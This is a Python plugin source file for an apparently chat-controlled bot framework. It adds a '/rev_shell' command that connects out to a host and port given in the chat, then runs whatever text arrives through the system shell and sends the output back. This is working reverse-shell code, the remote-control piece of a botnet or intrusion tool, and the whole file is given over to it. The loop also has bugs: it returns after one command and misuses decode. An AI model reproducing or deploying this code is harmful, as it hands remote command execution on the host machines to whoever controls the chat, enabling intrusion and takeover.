from plugins import Plugin, Command

from threading import Thread

import socket
import subprocess


class Main(Plugin):

    name = 'Reverse Shell'
    version = '1.0.0'

    def setup(self):
        
        c = Command('/rev_shell', usage='HOSTNAME /rev_shell <host> <port> - reverse shell')
        self.add_command(c)
        

    def handle(self, command, chat_id, *args, **kwargs):
        if command == '/rev_shell':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_rev_shell, args=tuple(arg_list))
            t.start()

    def handle_rev_shell(self, chat_id, ip, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, int(port)))
            self.bot.send_message(chat_id, 'Reverse shell started at host {}:{}'.format(ip, port))
            while True:
                s.send('{} $ '.format(self.bot.node).encode('utf-8'))
                data = s.recv(self.bot.socket_buffer_size).decode('utf-8', 'ignore')
                if data == "exit\n":
                    s.send('Reverse shell closed.\n'.encode('utf-8'))
                    self.bot.send_message(chat_id, 'Reverse shell closed')
                    break
                comm = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                STDOUT, STDERR = comm.communicate()
                s.send(STDOUT)
                s.send(STDERR)
                return
        except Exception as e:
            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e).decode('utf-8', 'ignore')))

        s.close()



